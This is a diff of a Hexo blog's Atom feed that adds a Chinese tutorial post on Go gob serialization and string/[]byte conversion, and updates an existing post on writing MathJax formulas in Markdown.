@@ -5,7 +5,7 @@
   <link href="/blog/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2016-04-14T10:29:14.248Z</updated>
+  <updated>2016-04-19T10:13:53.082Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -16,11 +16,40 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>Go中gob序列化反序列化</title>
+    <link href="http://yoursite.com/learning/learning/go-gob.html"/>
+    <id>http://yoursite.com/learning/learning/go-gob.html</id>
+    <published>2016-04-18T16:00:00.000Z</published>
+    <updated>2016-04-19T10:13:53.082Z</updated>
+    
+    <content type="html">&lt;h3 id=&quot;gob序列化反序列化&quot;&gt;&lt;a href=&quot;#gob序列化反序列化&quot; class=&quot;headerlink&quot; title=&quot;gob序列化反序列化&quot;&gt;&lt;/a&gt;gob序列化反序列化&lt;/h3&gt;&lt;p&gt;当使用了gob序列化一个对象，反序列化时一定要同样使用gob反序列化。因为使用gob序列化对象时会在字节数组最前面加上字节头数据。&lt;/p&gt;
+&lt;h3 id=&quot;普通string与-byte转换&quot;&gt;&lt;a href=&quot;#普通string与-byte转换&quot; class=&quot;headerlink&quot; title=&quot;普通string与[]byte转换&quot;&gt;&lt;/a&gt;普通&lt;strong&gt;string&lt;/strong&gt;与&lt;strong&gt;[]byte&lt;/strong&gt;转换&lt;/h3&gt;&lt;p&gt;string转换为byte数组&lt;/p&gt;
+&lt;figure class=&quot;highlight go&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;package&lt;/span&gt; main&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; (&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;fmt&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; main() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; s &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;abcdefg&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	bs := []&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;(s)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//[97 98 99 100 101 102 103]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	fmt.Println(bs)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;byte数组转string&lt;/p&gt;
+&lt;figure class=&quot;highlight go&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;package&lt;/span&gt; main&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; (&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;fmt&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; main() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; bs1 = []&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;&amp;#123;&lt;span class=&quot;number&quot;&gt;97&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;98&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;99&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;101&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;102&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;103&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; s &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; = &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt;(bs1)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//abcdefg&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	fmt.Println(s)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3 id=&quot;使用gob转换string和-byte&quot;&gt;&lt;a href=&quot;#使用gob转换string和-byte&quot; class=&quot;headerlink&quot; title=&quot;使用gob转换string和[]byte&quot;&gt;&lt;/a&gt;使用gob转换&lt;strong&gt;string&lt;/strong&gt;和&lt;strong&gt;[]byte&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;string转byte数组&lt;/p&gt;
+&lt;figure class=&quot;highlight go&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;package&lt;/span&gt; main&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; (&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;fmt&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;bytes&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;encoding/gob&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; main() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; s &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;abcdefg&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	buf := &amp;amp;bytes.Buffer&amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	gob.NewEncoder(buf).Encode(&amp;amp;s)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	bs := buf.Bytes()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//[10 12 0 7 97 98 99 100 101 102 103]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	fmt.Println(bs)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//     abcdefg&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	fmt.Println(s1)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;gob将string转byte数组时候会在最前面加上4个字节的头数据，这时如果使用普通方式将这个字节数组转string，前面会多出莫名奇妙的字符（显示为空格）。其中Encode()方法和Decode()方法都需传一个指针参数。Go会根据反射机制自动查找对应的数据结构类型。&lt;/p&gt;
+&lt;p&gt;byte数组转string&lt;/p&gt;
+&lt;figure class=&quot;highlight go&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;package&lt;/span&gt; main&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; (&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;fmt&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;bytes&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;encoding/gob&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; main() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; s &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;abcdefg&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	buf := &amp;amp;bytes.Buffer&amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	gob.NewEncoder(buf).Encode(&amp;amp;s)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; s1 &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	gob.NewDecoder(buf).Decode(&amp;amp;s1)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//abcdefg&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	fmt.Println(s1)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;gob序列化反序列化&quot;&gt;&lt;a href=&quot;#gob序列化反序列化&quot; class=&quot;headerlink&quot; title=&quot;gob序列化反序列化&quot;&gt;&lt;/a&gt;gob序列化反序列化&lt;/h3&gt;&lt;p&gt;当使用了gob序列化一个对象，反序列化时一定要同样使用gob反序列化。因为使
+    
+    </summary>
+    
+      <category term="学习" scheme="http://yoursite.com/categories/learning/"/>
+    
+    
+  </entry>
+  
+  <entry>
     <title>Mathjax in Markdown</title>
-    <link href="http://yoursite.com/learning/markdown-mathjax.html"/>
-    <id>http://yoursite.com/learning/markdown-mathjax.html</id>
+    <link href="http://yoursite.com/learning/learning/markdown-mathjax.html"/>
+    <id>http://yoursite.com/learning/learning/markdown-mathjax.html</id>
     <published>2016-04-11T16:00:00.000Z</published>
-    <updated>2016-04-14T10:29:14.248Z</updated>
+    <updated>2016-04-16T11:30:31.974Z</updated>
     
     <content type="html">&lt;h3 id=&quot;分数表示&quot;&gt;&lt;a href=&quot;#分数表示&quot; class=&quot;headerlink&quot; title=&quot;分数表示&quot;&gt;&lt;/a&gt;分数表示&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;\frac&amp;#123;1&amp;#125;&amp;#123;3&amp;#125; 或者 1 \over 3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;p&gt;$\frac{1}{3}$&lt;/p&gt;
@@ -42,22 +71,409 @@
 &lt;p&gt;$\prod_{i=0}^n \frac{1}{i^2}$&lt;/p&gt;
 &lt;h3 id=&quot;函数表示&quot;&gt;&lt;a href=&quot;#函数表示&quot; class=&quot;headerlink&quot; title=&quot;函数表示&quot;&gt;&lt;/a&gt;函数表示&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;\cos 2\theta = \cos^2 \theta - \sin^2 \theta =  2 \cos^2 \theta - 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;p&gt;$\cos 2\theta = \cos^2 \theta - \sin^2 \theta =  2 \cos^2 \theta - 1$&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$\frac&amp;#123;\partial u&amp;#125;&amp;#123;\partial t&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;= h^2 \left( \frac&amp;#123;\partial^2 u&amp;#125;&amp;#123;\partial x^2&amp;#125; +&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;\frac&amp;#123;\partial^2 u&amp;#125;&amp;#123;\partial y^2&amp;#125; +&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;\frac&amp;#123;\partial^2 u&amp;#125;&amp;#123;\partial z^2&amp;#125;\right)$&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;$\frac{\partial u}{\partial t}&lt;br&gt;= h^2 \left( \frac{\partial^2 u}{\partial x^2} +&lt;br&gt;\frac{\partial^2 u}{\partial y^2} +&lt;br&gt;\frac{\partial^2 u}{\partial z^2}\right)$&lt;/p&gt;
 &lt;h3 id=&quot;标准正态分布&quot;&gt;&lt;a href=&quot;#标准正态分布&quot; class=&quot;headerlink&quot; title=&quot;标准正态分布&quot;&gt;&lt;/a&gt;标准正态分布&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;f(x) = &amp;#123;1 \over \sigma\sqrt&amp;#123;2\pi&amp;#125; &amp;#125;&amp;#123;exp&amp;#125;^\left(&amp;#123;-&amp;#123;x^2 \over 2&amp;#125;&amp;#125;\right)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;p&gt;$f(x) = {1 \over \sigma\sqrt{2\pi} }{\rm exp}^\left({-{x^2 \over 2}}\right)$&lt;/p&gt;
 &lt;h3 id=&quot;希腊字母&quot;&gt;&lt;a href=&quot;#希腊字母&quot; class=&quot;headerlink&quot; title=&quot;希腊字母&quot;&gt;&lt;/a&gt;希腊字母&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;\alpha　A　\beta　B　\gamma　\Gamma　\delta　\Delta　\epsilon　E&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;\varepsilon　　\zeta　Z　\eta　H　\theta　\Theta　\vartheta \iota　I&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;\kappa　K　\lambda　\Lambda　\mu　M　\nu　N \xi　\Xi　o　O　\pi　\Pi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;\varpi　　\rho　P \varrho　　\sigma　\Sigma　\varsigma　　\tau　T&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;\upsilon　\Upsilon \phi　\Phi　\varphi　　\chi　X　\psi　\Psi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;\omega　\Omega&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;p&gt;$\alpha　A　\beta　B　\gamma　\Gamma　\delta　\Delta　\epsilon　E$&lt;br&gt;$\varepsilon　　\zeta　Z　\eta　H　\theta　\Theta　\vartheta \iota　I$&lt;br&gt;$\kappa　K　\lambda　\Lambda　\mu　M　\nu　N \xi　\Xi　o　O　\pi　\Pi$&lt;br&gt;$\varpi　　\rho　P \varrho　　\sigma　\Sigma　\varsigma　　\tau　T$&lt;br&gt;$\upsilon　\Upsilon \phi　\Phi　\varphi　　\chi　X　\psi　\Psi$&lt;br&gt;$\omega　\Omega$&lt;/p&gt;
 &lt;h3 id=&quot;字体&quot;&gt;&lt;a href=&quot;#字体&quot; class=&quot;headerlink&quot; title=&quot;字体&quot;&gt;&lt;/a&gt;字体&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;\rm　　罗马体　　　　　　　\it　　意大利体&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;\bf　　黑体　　　　　　　　\cal 　花体&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;\sl　　倾斜体　　　　　　　\sf　　等线体&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;\mit 　数学斜体　　　　　　\tt　　打字机字体&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;\sc　　小体大写字母&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;h3 id=&quot;其它特殊字符&quot;&gt;&lt;a href=&quot;#其它特殊字符&quot; class=&quot;headerlink&quot; title=&quot;其它特殊字符&quot;&gt;&lt;/a&gt;其它特殊字符&lt;/h3&gt;&lt;h4 id=&quot;关系运算&quot;&gt;&lt;a href=&quot;#关系运算&quot; class=&quot;headerlink&quot; title=&quot;关系运算&quot;&gt;&lt;/a&gt;关系运算&lt;/h4&gt;&lt;p&gt;\pm:$\pm$&lt;br&gt;\times:$\times$&lt;br&gt;\div:$\div$&lt;br&gt;\mid:$\mid$&lt;br&gt;\nmid:$\nmid$&lt;br&gt;\cdot:$\cdot$&lt;br&gt;\circ:$\circ$&lt;br&gt;\ast:$\ast$&lt;br&gt;\bigodot:$\bigodot$&lt;br&gt;\bigotimes:$\bigotimes$&lt;br&gt;\bigoplus:$\bigoplus$&lt;br&gt;\leq:$\leq$&lt;br&gt;\geq:$\geq$&lt;br&gt;\neq:$\neq$&lt;br&gt;\approx:$\approx$&lt;br&gt;\equiv:$\equiv$&lt;br&gt;\sum:$\sum$&lt;br&gt;\prod:$\prod$&lt;br&gt;\coprod:$\coprod$&lt;/p&gt;
-&lt;h4 id=&quot;集合运算&quot;&gt;&lt;a href=&quot;#集合运算&quot; class=&quot;headerlink&quot; title=&quot;集合运算&quot;&gt;&lt;/a&gt;集合运算&lt;/h4&gt;&lt;p&gt;\emptyset:$\emptyset$&lt;br&gt;\in:$\in$&lt;br&gt;\notin:$\notin$&lt;br&gt;\subset:$\subset$&lt;br&gt;\supset:$\supset$&lt;br&gt;\subseteq:$\subseteq$&lt;br&gt;\supseteq:$\supseteq$&lt;br&gt;\bigcap:$\bigcap$&lt;br&gt;\bigcup:$\bigcup$&lt;br&gt;\bigvee:$\bigvee$&lt;br&gt;\bigwedge:$\bigwedge$&lt;br&gt;\biguplus:$\biguplus$&lt;br&gt;\bigsqcup:$\bigsqcup$&lt;/p&gt;
-&lt;h4 id=&quot;对数运算&quot;&gt;&lt;a href=&quot;#对数运算&quot; class=&quot;headerlink&quot; title=&quot;对数运算&quot;&gt;&lt;/a&gt;对数运算&lt;/h4&gt;&lt;p&gt;\log:$\log$&lt;br&gt;\lg:$\lg$&lt;br&gt;\ln:$\ln$&lt;/p&gt;
